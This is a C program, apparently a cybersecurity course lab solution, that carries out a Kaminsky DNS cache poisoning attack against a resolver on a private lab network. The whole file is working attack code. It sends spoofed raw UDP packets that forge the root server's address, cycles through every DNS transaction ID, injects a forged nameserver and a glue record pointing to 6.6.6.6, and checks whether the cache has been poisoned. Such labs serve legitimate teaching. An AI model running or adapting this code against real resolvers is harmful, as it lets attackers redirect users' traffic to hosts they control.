
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>

#define RESOLVER_IP "192.168.1.203"
#define RESOLVER_DNS_PORT 53
#define ATTACKER_SER_IP "192.168.1.201"
#define ROOT_SERVER_IP "192.168.1.204"

struct my_ip_header {
    uint8_t version_and_length;
    uint8_t type_of_service;
    uint16_t total_length;
    uint16_t identification;
    uint16_t fragment_info;
    uint8_t time_to_live;
    uint8_t protocol;
    uint16_t header_checksum;
    uint32_t source_ip;
    uint32_t destination_ip;
};

struct my_udp_header {
    uint16_t source_port;
    uint16_t destination_port;
    uint16_t length;
    uint16_t checksum;
};

void send_first_request(void) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    printf("Building ldns query..\n");

    name = ldns_dname_new_frm_str("www.attacker.cybercourse.example.com");
    if (!name) {
        printf("name failed");
        exit(1);
    }

    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("query failed..");
        exit(1);
    }

    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
            printf("status failed..");
        exit(1);
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..");
        exit(1);
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons(RESOLVER_DNS_PORT);
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending trigger DNS query ->resolver (%s:53)...\n", RESOLVER_IP);
    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("send to failed..");
        exit(1);
    }

    close(udp_sockfd);
    free(wire);

    printf("[CLIENT] Trigger DNS query sent successfully");
}

uint16_t checksum_calc (uint16_t *buf, int len) {
    uint16_t sum = 0;
    int i = 0;

    while (len > 1) {
        sum = sum + buf[i];
        i = i + 1;
        len = len - 2;
    }

    if (len==1) {
        uint8_t *byte_buf = (uint8_t*)buf;
        sum = sum + (byte_buf[i *2] << 8);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~sum;
}

uint16_t udp_checksum_calc (struct my_ip_header *ip_header, struct my_udp_header *udp_header, uint8_t *udp_data, int data_length) {
    uint32_t checksum_sum = 0;
    int i = 0;

    uint16_t *source_ip_parts = (uint16_t *)&ip_header->source_ip;
    checksum_sum = checksum_sum + source_ip_parts[0];
    checksum_sum = checksum_sum + source_ip_parts[1];

    uint16_t  *dest_ip_parts = (uint16_t *)&ip_header->destination_ip;
    checksum_sum = checksum_sum + dest_ip_parts[0];
    checksum_sum = checksum_sum + dest_ip_parts[1];

    checksum_sum = checksum_sum + htons(IPPROTO_UDP);
    checksum_sum = checksum_sum + udp_header->length;

    udp_header->checksum = 0;
    uint16_t *udp_header_parts = (uint16_t *)udp_header;
    for (i = 0; i<4; i++) {
        checksum_sum = checksum_sum + udp_header_parts[i];
    }
    uint16_t *data_parts = (uint16_t *)udp_data;
    int remaining_bytes = data_length;

    while (remaining_bytes > 1) {
        checksum_sum = checksum_sum + *data_parts;
        data_parts = data_parts + 1;
        remaining_bytes = remaining_bytes - 2;
    }

    if (remaining_bytes == 1) {
        uint8_t *last_byte = (uint8_t *)data_parts;
        uint16_t padded_byte = (*last_byte) << 8;
        checksum_sum = checksum_sum + padded_byte;
    }

    while (checksum_sum >> 16) {
        checksum_sum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16);
    }

    return ~checksum_sum;
}

int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t txid, const char* subdomain) {
    ldns_pkt *pkt = NULL;
    ldns_rr *question_rr = NULL;
    ldns_rr *auth_rr = NULL;
    ldns_rr *glue_rr = NULL;
    ldns_rdf *owner_rdf = NULL;
    ldns_rdf *ns_rdf = NULL;
    ldns_rdf *ip_rdf = NULL;
    ldns_status status;

    pkt = ldns_pkt_new();
    if (!pkt) return 0;

    ldns_pkt_set_qr(pkt, true);
    ldns_pkt_set_aa(pkt, true);
    ldns_pkt_set_rd(pkt, true);
    ldns_pkt_set_ra(pkt, true);
    ldns_pkt_set_id(pkt, txid);
    ldns_pkt_set_rcode(pkt, LDNS_RCODE_NOERROR);

    question_rr = ldns_rr_new();
    if (question_rr) {
        owner_rdf = ldns_dname_new_frm_str(subdomain);
        if (owner_rdf) {
            ldns_rr_set_owner(question_rr, owner_rdf);
            ldns_rr_set_type(question_rr, LDNS_RR_TYPE_A);
            ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);
            ldns_pkt_push_rr(pkt, LDNS_SECTION_QUESTION, question_rr);
        }
    }

    auth_rr = ldns_rr_new();
    if (auth_rr) {
        owner_rdf = ldns_dname_new_frm_str("example1.cybercourse.example.com");
        ns_rdf = ldns_dname_new_frm_str("ns.attacker.cybercourse.example.com");
        if (owner_rdf && ns_rdf) {
            ldns_rr_set_owner(auth_rr, owner_rdf);
            ldns_rr_set_type(auth_rr, LDNS_RR_TYPE_NS);
            ldns_rr_set_class(auth_rr, LDNS_RR_CLASS_IN);
            ldns_rr_set_ttl(auth_rr, 300);
            ldns_rr_push_rdf(auth_rr, ns_rdf);
            ldns_pkt_push_rr(pkt, LDNS_SECTION_AUTHORITY, auth_rr);
        }
    }

    glue_rr = ldns_rr_new();
    if (glue_rr) {
        owner_rdf = ldns_dname_new_frm_str("ns.attacker.cybercourse.example.com");
        ip_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6");
        if (owner_rdf && ip_rdf) {
            ldns_rr_set_owner(glue_rr, owner_rdf);
            ldns_rr_set_type(glue_rr, LDNS_RR_TYPE_A);
            ldns_rr_set_class(glue_rr, LDNS_RR_CLASS_IN);
            ldns_rr_set_ttl(glue_rr, 300);
            ldns_rr_push_rdf(glue_rr, ip_rdf);
            ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, glue_rr);
        }
    }

    status = ldns_pkt2wire(wire_data, pkt, wire_size);
    ldns_pkt_free(pkt);

    return (status == LDNS_STATUS_OK) ? 1 : 0;
}

void send_subdomain_query(const char* domain_name) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    //creating the name from the domain name
    name = ldns_dname_new_frm_str(domain_name);
    if (!name) {
        printf("ldns_dname_new_frm_str failed..");
        exit(1);
    }

    // building the query
    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("ldns_pkt_query_new failed..");
        ldns_rdf_deep_free(name);
        exit(1);
    }

    //convert to wire format
    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
        printf("ldns_pkt2wire failed\n");
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..\n");
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons((RESOLVER_DNS_PORT));
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n", domain_name, RESOLVER_IP);

    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("sendto failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        exit(1);
    }

    close(udp_sockfd);
    free(wire);
    ldns_pkt_free(query);
    ldns_rdf_deep_free(name);
}

int check_poisoned(void) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    //creating the name from the domain name
    name = ldns_dname_new_frm_str("www.example1.cybercourse.example.com");
    if (!name) {
        printf("ldns_dname_new_frm_str failed..");
        return 0;
    }

    // building the query
    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("ldns_pkt_query_new failed..");
        ldns_rdf_deep_free(name);
        return 0;
    }

    //convert to wire format
    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
        printf("ldns_pkt2wire failed\n");
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..\n");
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons((RESOLVER_DNS_PORT));
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending subdomain query for %s -> resolver (%s:53)..\n");

    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("sendto failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(udp_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t resp_buf[1500];
    struct sockaddr_in src = {0};
    socklen_t srclen = sizeof(src);
    ssize_t n = recvfrom(udp_sockfd, resp_buf, sizeof(resp_buf), 0, (struct sockaddr*)&src, &srclen);
    if (n <= 0) {
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    ldns_pkt *resp_pkt = NULL;
    status = ldns_wire2pkt(&resp_pkt, resp_buf, (size_t)n);
    if (status != LDNS_STATUS_OK || !resp_pkt) {
        printf("ldns_wire2pkt failed..");
        close(udp_sockfd);
        free(wire);
        ldns_pkt_free(query);
        ldns_rdf_deep_free(name);
        return 0;
    }

    int poisoned = 0;
    ldns_rr_list *answer_list = ldns_pkt_answer(resp_pkt);
    size_t ancount = ldns_rr_list_rr_count(answer_list);
    for (size_t i = 0; i < ancount; i++) {
        ldns_rr *rr = ldns_rr_list_rr(answer_list, i);
        if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_A) {
            ldns_rdf *rdata = ldns_rr_rdf(rr, 0);
            char *ip_str = ldns_rdf2str(rdata);
            if (ip_str) {
                if (strncmp(ip_str, "6.6.6.6", 7) == 0) {
                    poisoned = 1;
                    free(ip_str);
                    break;
                }
                free(ip_str);
            }
        }
    }

    if (poisoned) {
        printf("[CLIENT] Detect poisoing: www.example1.cybercourse.example -> 6.6.6.6\n");

    } else {
        printf("[CLIENT] Not poisoned yet.\n");
    }

    close(udp_sockfd);
    free(wire);
    ldns_pkt_free(query);
    ldns_rdf_deep_free(name);
    free(resp_pkt);
    return poisoned;
}

int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
    int raw_socket;
    struct sockaddr_in target_address;
    uint8_t packet_buffer[1500];
    int packets_sent = 0;

    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (raw_socket <0 ) {
        printf("ERROR: could not create socket");
        return 0;
    }

    int enable_ip_header_include = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &enable_ip_header_include, sizeof(enable_ip_header_include)) < 0) {
        printf("ERROR: COULD NOT SET IP HEADER INCLUDE OPTION \n");
        close(raw_socket);
        return 0;
    }

    memset(&target_address, 0, sizeof(target_address));
    target_address.sin_family = AF_INET;
    inet_pton(AF_INET, RESOLVER_IP, &target_address.sin_addr);

    for (int txid = 0; txid < 65536 && packets_sent < budget; txid++) {
        uint8_t *dns_data = NULL;
        size_t dns_size = 0;

        int dns_created = create_kaminsky_response(&dns_data, &dns_size, txid, subdomain);
        if (dns_created != 1 || dns_data == NULL) {
            continue;
        }

        memset(packet_buffer, 0, sizeof(packet_buffer));

        struct my_ip_header *ip_header = (struct my_ip_header *)packet_buffer;
        struct my_udp_header *udp_header = (struct  my_udp_header *)(packet_buffer + sizeof(struct my_ip_header));
        uint8_t *dns_payload = packet_buffer + sizeof(struct my_ip_header) + sizeof(struct my_udp_header);

        ip_header->version_and_length = (4 << 4) | 5;
        ip_header->type_of_service = 0;
        ip_header->identification = htons(txid);
        ip_header->fragment_info = 0;
        ip_header->time_to_live = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->header_checksum = 0;

        inet_pton(AF_INET, ROOT_SERVER_IP, &ip_header->source_ip);
        inet_pton(AF_INET, RESOLVER_IP, &ip_header->destination_ip);

        udp_header->source_port = htons(53);
        udp_header->destination_port = htons(resolver_port);
        udp_header->length = htons(sizeof(struct my_udp_header) + dns_size);

        memcpy(dns_payload, dns_data, dns_size);

        int total_packet_size = sizeof(struct my_ip_header) + sizeof(struct my_udp_header) + dns_size;
        ip_header->total_length = htons(total_packet_size);

        ip_header->header_checksum = checksum_calc((uint16_t *)ip_header, sizeof(struct my_ip_header));
        udp_header->checksum = udp_checksum_calc(ip_header, udp_header, dns_payload, dns_size);

        int bytes_sent = sendto(raw_socket, packet_buffer, total_packet_size, 0, (struct sockaddr *)&target_address, sizeof(target_address));
        if (bytes_sent > 0) {
            packets_sent = packets_sent + 1;
        }
        free(dns_data);

        if (packets_sent % 500 == 0 && packets_sent > 0) {
            usleep(200);
            printf("[SPOOF] Sent %d packets so far...\n", packets_sent);
        }
    }
    close(raw_socket);
    printf("[SPOOF] aTTACK COMPLETE");

    return packets_sent;
}

int main(void) {
    // DNS request to the resolver->attacker domain
    send_first_request();
    sleep(1);
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt (SO_REUSEADDR) failed..\n");
        close(sockfd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt (SO_REUSEPORT) failed..\n");
        close(sockfd);
        exit(1);
    }

    struct sockaddr_in srv = {0};
    srv.sin_family = AF_INET;
    srv.sin_port = htons(12345);
    inet_pton(AF_INET, ATTACKER_SER_IP, &srv.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        printf("connect failed..");
        exit(1);
    }
    int resolver_port;
    recv(sockfd, &resolver_port, sizeof(resolver_port), 0);

    printf("Client received: %d\n", resolver_port);

    close(sockfd);

    const int MAX_SPOOFED = 20 * 65536;
    int total_spoofed = 0;
    const int MAX_ROUNDS = 20;

    for (int round = 0; round < MAX_ROUNDS && total_spoofed < MAX_SPOOFED; round++) {
        char subdomain[256];
        snprintf(subdomain, sizeof(subdomain), "ww%d.example1.cybercourse.example.com", round);
        printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);

        send_subdomain_query(subdomain);

        int budget = MAX_SPOOFED - total_spoofed;
        int sent_now = send_spoof_burst(subdomain, resolver_port, budget);
        total_spoofed = total_spoofed + sent_now;

        printf("[CLIENT] Total spoofed so far: %d (limit %d)\n", total_spoofed, MAX_SPOOFED);
        if (check_poisoned()) {
            break;
        }
    }
    return 0;
}